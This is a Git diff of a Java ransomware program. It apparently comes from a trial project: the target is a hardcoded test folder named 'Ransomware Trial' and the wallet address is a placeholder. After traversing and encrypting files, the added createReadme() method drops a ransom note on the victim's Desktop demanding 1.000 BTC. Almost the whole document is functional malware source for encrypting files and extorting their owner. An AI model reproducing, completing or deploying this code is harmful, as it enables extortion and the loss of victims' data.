@@ -4,8 +4,10 @@ import org.apache.commons.cli.*;
 
 import javax.crypto.SecretKey;
 import javax.crypto.spec.SecretKeySpec;
+import java.io.BufferedWriter;
 import java.io.File;
-import java.nio.charset.StandardCharsets;
+import java.io.FileWriter;
+import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
@@ -19,6 +21,7 @@ class App {
     private static SecretKey DECRYPTION_KEY;
 
     public static void main(String[] args) {
+        // Paths.get(System.getProperty("user.dir"))
         PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial\\Fullstack-Auction-Website";
         CURR_OS_EXCLUDED_FOLDERS = OS.getCurrentOS() == OS.WINDOWS ? OS.Windows.getExcludedFolders() : OS.Linux.getExcludedFolders();
 
@@ -118,11 +121,30 @@ class App {
 
             if (cmd.hasOption("encrypt")) {
                 traverseAndEncrypt(new File(PATH).listFiles());
+                createReadme();
             }
         } catch (MissingArgumentException e) {
             System.out.println("Missing argument.");
         } catch (ParseException e) {
             System.out.println("Parsing error.");
+        }
+    }
+
+    private static void createReadme() {
+        try (FileWriter fileWriter = new FileWriter(
+                System.getProperty("user.home") +
+                        File.separator +
+                        "Desktop" + File.separator +
+                        "README.txt"
+        )) {
+            BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
+            bufferedWriter.write(
+                    "Your files are encrypted.\n" +
+                            "If you want to decrypt your files, send 1.000 BTC to This Crypto Wallet.\n" +
+                            "Wallet Address: xxxx");
+            bufferedWriter.close();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
         }
     }
 }
